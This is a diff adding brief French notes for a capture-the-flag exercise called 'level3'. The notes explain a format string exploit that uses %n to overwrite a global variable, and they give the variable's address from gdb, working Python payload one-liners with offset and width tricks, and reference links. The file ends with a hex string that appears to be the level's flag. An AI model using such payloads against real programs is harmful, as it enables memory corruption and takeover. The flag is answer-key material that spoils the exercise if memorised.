@@ -1,0 +1,24 @@
+level3 : 
+
+idée : écrire l'adresse de m sur la stack , puis écrire 64 dessus grâce à %n. Il faut trouver le bon nombre de %x 
+dans gdb
+info variable  
+0x0804988c  m →\x8c\x98\x04\x08
+(python -c "print '\x8c\x98\x04\x08'") | ./level3
+pour trouver l’offset de l’adresse de m qu’on a mis en input et ou on va écrire 64
+cf : page 229 de grey hat hacking
+%n = nombre de caractères déjà écrit → il faut en écrire 64. m = 4 byte donc 60 * A
+
+(read in the stack at the specifying address)
+%[n]$s
+http://www.infond.fr/2010/07/tutorial-exploitation-format-string.html
+https://cs155.stanford.edu/papers/formatstring-1.2.pdf
+page 13
+https://pages.cs.wisc.edu/~ace/media/gray-hat-hacking.pdf
+page 230
+
+(python -c "print '\x8c\x98\x04\x08' + 'A'*60 + '%4\$n'"; cat) | ./level3
+OU
+(python -c "print '\x8c\x98\x04\x08' + '%60x' + '%4\$n'"; cat) | ./level3 → utilisation de la width
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
